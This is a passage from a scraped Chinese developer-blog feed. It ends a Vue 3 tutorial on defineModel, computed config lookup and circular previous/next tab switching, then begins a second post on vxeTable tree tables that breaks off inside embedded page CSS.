<pre><code class="hljs language-javascript" lang="javascript">defineModel&lt;boolean&gt;(<span class="hljs-string">'isShow'</span>, ...)
</code></pre>
<p>表示这个 model 的名字叫 isShow</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">type:</span> <span class="hljs-type">Boolean</span>,
<span class="hljs-symbol">default:</span> <span class="hljs-literal">false</span>,
</code></pre>
<p>声明这个 prop 的类型是 Boolean（Vue 的运行时类型检查用）</p>
<p>父组件不传值时，默认值是 false</p>
<p>在子组件里可以直接使用,父组件也会同时更新（双向绑定效果）</p>
<pre><code class="hljs language-javascript" lang="javascript">isShow.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
</code></pre>
</blockquote>
<p><strong>3.默认绑定一个 tab</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> activeTab = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'move-forward-backward'</span>)
</code></pre>
<p><strong>4.维护当前的配置项</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> currentConfig = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
})
</code></pre>
<p>使用计算属性，每次AllConfig 或者activeTab 发生变化的时候触发，保证currentConfig 拿到了当前选中的这项</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> guideTips = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">info</span>
})
<span class="hljs-keyword">const</span> guideImg = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> currentConfig.<span class="hljs-property">value</span>?.<span class="hljs-property">img</span>
})
</code></pre>
<blockquote>
<p><code>currentConfig.value?</code>: 因为 <code>currentConfig</code> 是一个计算属性，所以需要用 <code>.value</code> 来访问它的结果。<code>?</code> 是可选链操作符，它防止在 <code>currentConfig.value</code> 为 <code>null</code> 或 <code>undefined</code> 时程序崩溃。</p>
<p><code>...?.info</code>: 它尝试获取当前配置对象中的 <code>info</code> 属性。</p>
<p>作用: <code>guideTips</code> 响应式地保存着当前激活标签对应的提示信息。</p>
<p>图片也同理,看 setting 中的配置就行</p>
</blockquote>
<p><strong>5.更新当前的点击项</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTabClick</span> = (<span class="hljs-params">tab: string</span>) =&gt; {
  activeTab.<span class="hljs-property">value</span> = tab
}
</code></pre>
<blockquote>
<p>更新当前点击的 tab</p>
</blockquote>
<p><strong>6.切换上一项切换下一项的核心函数</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePrev</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> prevIndex = (currentIndex - <span class="hljs-number">1</span> + <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> prevConfig = <span class="hljs-title class_">AllConfig</span>[prevIndex]
  <span class="hljs-keyword">if</span> (prevConfig) {
    activeTab.<span class="hljs-property">value</span> = prevConfig.<span class="hljs-property">value</span>
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNext</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> currentIndex = <span class="hljs-title class_">AllConfig</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">value</span> === activeTab.<span class="hljs-property">value</span>)
  <span class="hljs-keyword">if</span> (currentIndex === -<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> nextIndex = (currentIndex + <span class="hljs-number">1</span>) % <span class="hljs-title class_">AllConfig</span>.<span class="hljs-property">length</span>
  <span class="hljs-keyword">const</span> nextConfig = <span class="hljs-title class_">AllConfig</span>[nextIndex]
  <span class="hljs-keyword">if</span> (nextConfig) {
    activeTab.<span class="hljs-property">value</span> = nextConfig.<span class="hljs-property">value</span>
  }
}

</code></pre>
<p>核心函数:切换上一项和切换下一项</p>
<p>以切换上一项为例(切换下一项同理):</p>
<ul>
<li>首先拿到当前下标</li>
<li>如果没拿到就返回(防御式编程)</li>
<li>利用当前下标,计算出上一项下标(实现循环)</li>
<li>更新当前的 active.tab</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[关于vxeTable转换树状表格以及问题思考]]></title>    <link>https://juejin.cn/post/7579920818870140970</link>    <guid>https://juejin.cn/post/7579920818870140970</guid>    <pubDate>2025-12-05T03:35:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579920818870140970" data-draft-id="7579846221167968310" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="关于vxeTable转换树状表格以及问题思考"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-05T03:35:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zReadonly"/> <meta itemprop="url" content="https://juejin.cn/user/3430911593418830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            关于vxeTable转换树状表格以及问题思考
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3430911593418830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zReadonly
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:35:06.000Z" title="Fri Dec 05 2025 03:35:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 